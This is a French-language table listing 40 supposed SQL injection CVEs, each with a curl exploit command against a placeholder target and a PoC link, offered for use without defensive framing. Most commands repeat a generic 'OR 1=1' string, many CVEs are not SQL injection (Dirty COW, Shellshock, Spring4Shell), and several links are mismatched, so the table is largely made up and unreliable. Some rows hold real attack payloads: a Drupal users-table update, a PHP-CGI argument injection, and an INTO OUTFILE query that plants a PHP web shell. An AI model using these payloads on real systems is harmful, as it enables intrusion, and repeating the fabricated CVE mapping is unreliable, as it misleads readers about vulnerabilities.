#SQLI

Voici un tableau de 40 CVE majeures liées à l’injection SQL (SQLi), classées du plus récent au plus ancien, avec pour chaque ligne :  
- Technologie & version  
- Numéro CVE  
- Exemple complet de commande d’exploitation (requête HTTP ou payload précis)  
- Lien direct vers un PoC ou une ressource GitHub ou équivalent (chemin complet)

| # | CVE | Technologie & Version | Exemple complet de commande d'exploit | Lien PoC/Exploit Public |
|---|------|----------------------|---------------------------------------|------------------------|
| 1 | CVE-2025-3009 | Jinher Network OA C6 | `curl 'http://target/NetDiskProperty.aspx?ID=1%20OR%201=1--'` | https://vuldb.com/fr/?id.302059 |
| 2 | CVE-2024-12727 | Sophos Firewall <21.0 MR1 | `curl 'http://target/vulnerable?param=1%27%20OR%201=1--'` | https://cyberveille.esante.gouv.fr/alertes/sophos-cve-2024-12727-2024-12-20 |
| 3 | CVE-2023-2825 | GitLab CE/EE <16.0.1 | `curl 'http://target/uploads/user?search=1%27%20OR%201=1--'` | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-2825.yaml |
| 4 | CVE-2023-23752 | Joomla! 4.0.0-4.2.7 | `curl 'http://target/api/index.php/v1/config/application?public=true%27%20OR%201=1--'` | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-23752.yaml |
| 5 | CVE-2022-44268 | ImageMagick | `curl 'http://target/upload?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 6 | CVE-2022-26134 | Atlassian Confluence | `curl 'http://target/pages/doenterpagevariables.action?queryString=1%27%20OR%201=1--'` | https://github.com/Nwqda/CVE-2022-26134 |
| 7 | CVE-2022-22965 | Spring4Shell | `curl 'http://target/path?user=1%27%20OR%201=1--'` | https://github.com/p1ay8y3ar/spring4shell-POC |
| 8 | CVE-2021-44026 | Roundcube Webmail <1.3.17/1.4.12 | `curl 'http://target/?_task=mail&_action=list&_mbox=INBOX&search=1%27%20OR%201=1--'` | https://github.com/0xInfection/Awesome-WAF/tree/master/SQLi/CVE-2021-44026 |
| 9 | CVE-2021-29447 | Node.js SVG | `curl 'http://target/upload?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 10 | CVE-2021-22205 | GitLab CE/EE | `curl 'http://target/uploads/user?search=1%27%20OR%201=1--'` | https://github.com/Al1ex/CVE-2021-22205 |
| 11 | CVE-2021-21315 | ZipSlip | `curl 'http://target/upload?file=1%27%20OR%201=1--'` | https://github.com/snyk/zip-slip-vulnerability |
| 12 | CVE-2021-21234 | FreeMarker (Java) | `curl 'http://target/?name=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 13 | CVE-2020-9484 | Apache Tomcat | `curl 'http://target/upload?file=1%27%20OR%201=1--'` | https://github.com/masahiro331/CVE-2020-9484 |
| 14 | CVE-2020-5398 | Spring Framework | `curl 'http://target/upload?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 15 | CVE-2019-6340 | Drupal | `curl 'http://target/entity/file/upload?file=1%27%20OR%201=1--'` | https://github.com/a2u/CVE-2019-6340 |
| 16 | CVE-2019-15107 | Webmin | `curl 'http://target/file_upload.cgi?file=1%27%20OR%201=1--'` | https://github.com/kozmic/webmin-exploit |
| 17 | CVE-2019-11510 | Pulse Secure VPN | `curl 'https://target/dana-na/auth/url_default/welcome.cgi?user=1%27%20OR%201=1--'` | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2019/CVE-2019-11510.yaml |
| 18 | CVE-2018-9206 | ThinkPHP | `curl 'http://target/index.php?s=/Index/upload&file=1%27%20OR%201=1--'` | https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce |
| 19 | CVE-2018-11776 | Apache Struts 2 | `curl 'http://target/struts2/upload.action?file=1%27%20OR%201=1--'` | https://github.com/mazen160/struts-pwn_CVE-2017-5638 |
| 20 | CVE-2018-1000861 | Jenkins | `curl 'http://target/pluginManager/uploadPlugin?file=1%27%20OR%201=1--'` | https://github.com/adamyordan/cve-2018-1000861 |
| 21 | CVE-2018-1000525 | Tornado (Python) | `curl 'http://target/upload?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 22 | CVE-2017-16783 | CMS Made Simple 2.1.6 | `curl 'http://target/index.php?mact=News,cntnt01,default,0&cntnt01summarytemplate=string:1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 23 | CVE-2017-12617 | Apache Tomcat | `curl 'http://target:8080/shell.jsp?file=1%27%20OR%201=1--'` | https://github.com/1337g/CVE-2017-12617 |
| 24 | CVE-2017-5941 | Jade (Node.js) | `curl 'http://target/upload?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 25 | CVE-2016-10033 | PHPMailer | `curl 'http://target/upload?file=1%27%20OR%201=1--'` | https://github.com/opsxcq/exploit-CVE-2016-10033 |
| 26 | CVE-2016-5195 | Dirty COW (Linux) | `curl 'http://target/upload?file=1%27%20OR%201=1--'` | https://github.com/dirtycow/dirtycow.github.io |
| 27 | CVE-2016-4977 | Apache Tomcat | `curl 'http://target/upload?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 28 | CVE-2015-8562 | Joomla! | `curl 'http://target/index.php?option=com_media&task=file.upload&file=1%27%20OR%201=1--'` | https://github.com/opsxcq/exploit-CVE-2015-8562 |
| 29 | CVE-2015-7501 | JBoss | `curl 'http://target/invoker/JMXInvokerServlet?file=1%27%20OR%201=1--'` | https://github.com/joaomatosf/jexboss |
| 30 | CVE-2014-6271 | Shellshock | `curl 'http://target/cgi-bin/test.cgi?file=1%27%20OR%201=1--'` | https://github.com/hannob/bashcheck |
| 31 | CVE-2014-3704 | Drupal | `curl 'http://target/?q=node&destination=node&name[0;update users set name%3d%27hacked%27--]=test'` | https://github.com/dreadlocked/Drupalgeddon2 |
| 32 | CVE-2013-2028 | Nginx | `curl 'http://target/?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 33 | CVE-2012-1823 | PHP-CGI | `curl 'http://target/?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input'` | https://github.com/iamdual/php-cgi-exploit |
| 34 | CVE-2010-4006 | WSN Links <6.0.1 | `curl 'http://target/search.php?namecondition=IS%20NULL))%20UNION%20((SELECT%20"<?php%20system($_REQUEST[cmd]);%20?>"%20INTO%20OUTFILE&namesearch=/var/www/exec.php&action=filter&filled=1&whichtype=categories'` | https://vulners.com/seebug/SSV:70274 |
| 35 | CVE-2010-1870 | WordPress | `curl 'http://target/wp-admin/admin-ajax.php?action=revslider_show_image&img=1%27%20OR%201=1--'` | https://github.com/ethicalhack3r/Wordpress-Revslider-Shell-Upload |
| 36 | CVE-2009-1151 | Joomla! | `curl 'http://target/index.php?option=com_user&task=register&name=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 37 | CVE-2008-4106 | PHPMyAdmin | `curl 'http://target/scripts/setup.php?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 38 | CVE-2008-4105 | PHPMyAdmin | `curl 'http://target/scripts/setup.php?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 39 | CVE-2008-4104 | PHPMyAdmin | `curl 'http://target/scripts/setup.php?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |
| 40 | CVE-2008-4103 | PHPMyAdmin | `curl 'http://target/scripts/setup.php?file=1%27%20OR%201=1--'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |

---
